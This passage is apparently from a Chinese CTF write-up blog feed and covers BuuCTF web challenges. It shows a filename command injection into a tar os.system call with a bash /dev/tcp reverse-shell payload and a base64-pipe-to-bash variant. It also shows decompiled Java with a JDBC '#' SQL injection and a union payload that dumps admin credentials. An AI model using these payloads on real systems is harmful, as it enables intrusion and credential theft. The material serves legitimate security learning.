class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> file.content_length &gt; <span class="hljs-number">10240</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;file too lager&#x27;</span><br>    path = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="hljs-number">16</span>))<br>    directory = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)<br>    os.makedirs(directory, mode=<span class="hljs-number">0o755</span>, exist_ok=<span class="hljs-literal">True</span>)<br>    savepath=os.path.join(directory, file.filename)<br>    file.save(savepath)<br>    <span class="hljs-keyword">try</span>:<br>     os.system(<span class="hljs-string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(savepath,directory))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;something wrong in extracting&#x27;</span><br></code></pre></td></tr></table></figure><p>先限制了文件长度不能大于<code>10240</code>，然后利用十六个随机的十六进制数拼接成<code>path</code>。再利用<code>os.path.join</code>把这个<code>path</code>和<code>app.config[&#39;UPLOAD_FOLDER&#39;]</code>拼接成一个完整路径赋值给<code>directory</code>。<code>savepath</code>同上。然后调用<code>os.system</code>中的<code>tar</code>把目标文件解压到<code>directory</code>路径中。</p><p><code>os.system</code>这东西会执行系统命令<code>filename</code>可控导致<code>savepath</code>可控。</p><p><a href="https://blog.csdn.net/weixin_44558805/article/details/131456350">参考资料</a></p><p>可以通过构造<code>xxx.tar||xxxxx</code>来执行命令，不过单纯一个<code>os.system</code>是不存在回显的所以考虑反弹<code>shell</code>:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">thr</span>.txt || echo bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxxx/<span class="hljs-number">9001</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>&#x27;<br></code></pre></td></tr></table></figure><p>但注意<code>savepath</code>中不能包含特殊字符，base64加密一下就行：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">echo xxxxxxx|<span class="hljs-string"> base64 -d </span>|<span class="hljs-string"> bash </span>|<br></code></pre></td></tr></table></figure><p>最后加两个<code>|</code>闭合也行：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">echo xxxxxxx|<span class="hljs-string"> base64 -d </span>|<span class="hljs-string"> bash </span>||<br></code></pre></td></tr></table></figure><h4 id="思路总结：-1"><a href="#思路总结：-1" class="headerlink" title="思路总结："></a>思路总结：</h4><p><code>os.system</code>命令？是否有回显？以及对于：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(savepath,<span class="hljs-built_in">directory</span>))<br></code></pre></td></tr></table></figure><p>是否可以考虑命令注入？</p><h2 id="CISCN-2023-初赛-DeserBug"><a href="#CISCN-2023-初赛-DeserBug" class="headerlink" title="[CISCN 2023 初赛]DeserBug"></a>[CISCN 2023 初赛]DeserBug</h2><p>题目给了附件，<code>jar-gui</code>打开：</p>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTF做题记录_9</title>
    <link href="/2024/01/10/2023-12-28-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_9/"/>
    <url>/2024/01/10/2023-12-28-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_9/</url>
    
    <content type="html"><![CDATA[<p>初学者的一些做题记录</p><span id="more"></span><hr><h2 id="网鼎杯-2020-朱雀组-Think-Java-未做完"><a href="#网鼎杯-2020-朱雀组-Think-Java-未做完" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java(未做完)"></a>[网鼎杯 2020 朱雀组]Think Java(未做完)</h2><p>几个附件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Row.class</span><br><span class="hljs-keyword">package</span> cn.abc.core.sqldict;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Row</span> &#123;<br>    String name;<br>    String type;<br>    String def;<br>    String isNull;<br>    String isAuto;<br>    String remark;<br>    String isPK;<br>    String size;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getIsPK</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.isPK;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setIsPK</span><span class="hljs-params">(String isPK)</span> &#123;<br>        <span class="hljs-built_in">this</span>.isPK = isPK;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.type;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setType</span><span class="hljs-params">(String type)</span> &#123;<br>        <span class="hljs-built_in">this</span>.type = type;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDef</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.def;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDef</span><span class="hljs-params">(String def)</span> &#123;<br>        <span class="hljs-built_in">this</span>.def = def;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getIsNull</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.isNull;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setIsNull</span><span class="hljs-params">(String isNull)</span> &#123;<br>        <span class="hljs-built_in">this</span>.isNull = isNull;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getIsAuto</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.isAuto;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setIsAuto</span><span class="hljs-params">(String isAuto)</span> &#123;<br>        <span class="hljs-built_in">this</span>.isAuto = isAuto;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRemark</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.remark;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRemark</span><span class="hljs-params">(String remark)</span> &#123;<br>        <span class="hljs-built_in">this</span>.remark = remark;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getSize</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.size;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSize</span><span class="hljs-params">(String size)</span> &#123;<br>        <span class="hljs-built_in">this</span>.size = size;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Row</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Row</span><span class="hljs-params">(String name, String type, String def, String isNull, String isAuto, String remark, String isPK, String size)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.type = type;<br>        <span class="hljs-built_in">this</span>.def = def;<br>        <span class="hljs-built_in">this</span>.isNull = isNull;<br>        <span class="hljs-built_in">this</span>.isAuto = isAuto;<br>        <span class="hljs-built_in">this</span>.remark = remark;<br>        <span class="hljs-built_in">this</span>.isPK = isPK;<br>        <span class="hljs-built_in">this</span>.size = size;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//sqlDict.class</span><br><span class="hljs-keyword">package</span> cn.abc.core.sqldict;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DatabaseMetaData;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SqlDict</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SqlDict</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbName, String user, String pass)</span> &#123;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);<br>            <span class="hljs-keyword">if</span> (dbName != <span class="hljs-literal">null</span> &amp;&amp; !dbName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                dbName = <span class="hljs-string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                dbName = <span class="hljs-string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span> || dbName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                user = <span class="hljs-string">&quot;root&quot;</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (pass == <span class="hljs-literal">null</span> || dbName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                pass = <span class="hljs-string">&quot;abc@12345&quot;</span>;<br>            &#125;<br><br>            conn = DriverManager.getConnection(dbName, user, pass);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var5) &#123;<br>            var5.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException var6) &#123;<br>            var6.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> conn;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Table&gt; <span class="hljs-title function_">getTableData</span><span class="hljs-params">(String dbName, String user, String pass)</span> &#123;<br>        List&lt;Table&gt; Tables = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> getConnection(dbName, user, pass);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">TableName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br>            <span class="hljs-type">DatabaseMetaData</span> <span class="hljs-variable">metaData</span> <span class="hljs-operator">=</span> conn.getMetaData();<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">tableNames</span> <span class="hljs-operator">=</span> metaData.getTables((String)<span class="hljs-literal">null</span>, (String)<span class="hljs-literal">null</span>, (String)<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;TABLE&quot;</span>&#125;);<br><br>            <span class="hljs-keyword">while</span>(tableNames.next()) &#123;<br>                TableName = tableNames.getString(<span class="hljs-number">3</span>);<br>                <span class="hljs-type">Table</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Table</span>();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="hljs-string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(sql);<br><br>                <span class="hljs-keyword">while</span>(rs.next()) &#123;<br>                    table.setTableDescribe(rs.getString(<span class="hljs-string">&quot;TABLE_COMMENT&quot;</span>));<br>                &#125;<br><br>                table.setTableName(TableName);<br>                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> metaData.getColumns(conn.getCatalog(), (String)<span class="hljs-literal">null</span>, TableName, <span class="hljs-string">&quot;&quot;</span>);<br>                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs2</span> <span class="hljs-operator">=</span> metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="hljs-literal">null</span>, TableName);<br><br>                String PK;<br>                <span class="hljs-keyword">for</span>(PK = <span class="hljs-string">&quot;&quot;</span>; rs2.next(); PK = rs2.getString(<span class="hljs-number">4</span>)) &#123;<br>                &#125;<br><br>                <span class="hljs-keyword">while</span>(data.next()) &#123;<br>                    <span class="hljs-type">Row</span> <span class="hljs-variable">row</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Row</span>(data.getString(<span class="hljs-string">&quot;COLUMN_NAME&quot;</span>), data.getString(<span class="hljs-string">&quot;TYPE_NAME&quot;</span>), data.getString(<span class="hljs-string">&quot;COLUMN_DEF&quot;</span>), data.getString(<span class="hljs-string">&quot;NULLABLE&quot;</span>).equals(<span class="hljs-string">&quot;1&quot;</span>) ? <span class="hljs-string">&quot;YES&quot;</span> : <span class="hljs-string">&quot;NO&quot;</span>, data.getString(<span class="hljs-string">&quot;IS_AUTOINCREMENT&quot;</span>), data.getString(<span class="hljs-string">&quot;REMARKS&quot;</span>), data.getString(<span class="hljs-string">&quot;COLUMN_NAME&quot;</span>).equals(PK) ? <span class="hljs-string">&quot;true&quot;</span> : <span class="hljs-literal">null</span>, data.getString(<span class="hljs-string">&quot;COLUMN_SIZE&quot;</span>));<br>                    table.list.add(row);<br>                &#125;<br><br>                Tables.add(table);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException var16) &#123;<br>            var16.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> Tables;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//table.class</span><br><span class="hljs-keyword">package</span> cn.abc.core.sqldict;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Table</span> &#123;<br>    String tableName;<br>    String tableDescribe;<br>    List&lt;Row&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Table</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getTableDescribe</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.tableDescribe;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTableDescribe</span><span class="hljs-params">(String tableDescribe)</span> &#123;<br>        <span class="hljs-built_in">this</span>.tableDescribe = tableDescribe;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getTableName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.tableName;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTableName</span><span class="hljs-params">(String tableName)</span> &#123;<br>        <span class="hljs-built_in">this</span>.tableName = tableName;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> List&lt;Row&gt; <span class="hljs-title function_">getList</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.list;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setList</span><span class="hljs-params">(List&lt;Row&gt; list)</span> &#123;<br>        <span class="hljs-built_in">this</span>.list = list;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/RABCDXB/article/details/124003575">参考文章</a></p><p><a href="https://guokeya.github.io/post/u6ks9KJMm/">参考文章</a></p><p>首先是这部分，存在<code>SQL</code>注入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (dbName != <span class="hljs-literal">null</span> &amp;&amp; !dbName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>        dbName = <span class="hljs-string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        dbName = <span class="hljs-string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;<br>      &#125; <br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="hljs-string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>其实正常<code>SQL</code>注入肯定想着用注释号去注释某部分<code>SQL</code>语句，对于<code>Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#39;&quot; + dbName + &quot;&#39; and table_name=&#39;&quot; + TableName + &quot;&#39;;</code>这个<code>SQL</code>语句肯定想着<code>dbName</code>是注入点，但<code>dbName</code>这东西还会带入到<code>dbName = &quot;jdbc:mysql://mysqldbserver:3306/&quot; + dbName;</code>这个赋值语句里。</p><p>jdbc类似URL解析。所以当我们输入<code>myapp#&#39; union select 1#</code>时， <code>#</code>在URL中是锚点。所以有：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">jdbc:mysql://mysqldbserver:3306/myapp<span class="hljs-comment">#&#x27; union select 1#</span><br>会被解析成<br>jdbc:mysql://mysqldbserver:3306/myapp<br><br>再带入sql语句<br>Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = <span class="hljs-string">&#x27;叉叉叉#&#x27;</span> union <span class="hljs-keyword">select</span> 1<span class="hljs-comment">#&#x27; and table_name=&#x27;&quot; + TableName + &quot;&#x27;</span><br>参考文章里对第一个<span class="hljs-comment">#号的解释是因为被引号包裹了所以被认为是普通字符：</span><br>第一个<span class="hljs-comment">#被单引号包裹。成了普通的#字符。第二个#注释掉了后面的语句。造成sql注入</span><br></code></pre></td></tr></table></figure><p>当然，这里用<code>?</code>也行，比如(不过注意用了?一定要成键值对)：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">jdbc</span>:mysql://localhost:<span class="hljs-number">3306</span>/myapp?a=<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><p>接下来就是<code>import io.swagger.annotations.ApiOperation;</code>这个东西：</p><blockquote><p>swagger 提供了一个用于浏览和测试 API 的交互式用户界面，通常称为 Swagger UI。当你在应用程序中集成了 Swagger，并启动应用程序时，Swagger UI 将在 <code>/swagger-ui.html</code> 路径上提供一个可视化的界面，展示了你的 API 的各种信息，包括接口、参数、响应等。</p></blockquote><p>访问，三个路由：</p><p><img src="/img/wdbthinkjava1.png" alt="wdbthinkjava1"></p><p><img src="/img/wdbthinkjava2.png" alt="wdbthinkjava2"></p><p>后面就是爆库报表爆列，这里不详细说了，最后爆用户名和密码的<code>payload</code>:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">dbName=myapp#&#x27; union <span class="hljs-keyword">select</span> group_concat(name,<span class="hljs-number">0x7e</span>,pwd)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">user</span>)#<br>得到：<br>admin~admin@Rrrr_ctf_asde<br></code></pre></td></tr></table></figure><p>我看网上很多<code>wp</code>都直接在<code>swagger</code>那里操作了。。但我这个不行，只好用burp抓包修改：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin@Rrrr_ctf_asde&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdbthinkjava4.png" alt="wdbthinkjava4"></p><p>下面要把这东西放到<code>/common/user/current</code>路由认证一下，我的环境有问题就用其它师傅的图了：</p><p><img src="/img/wdbthinkjava5.png" alt="wdbthinkjava5"></p><p>接下来是对这个字符串的分析：</p><blockquote><p>一段数据以rO0AB开头，你基本可以确定这串就是Java序列化base64加密的数据。<br> 或者如果以aced开头，那么他就是这一段Java序列化的16进制。</p></blockquote><h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p><code>www.zip</code>泄露：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 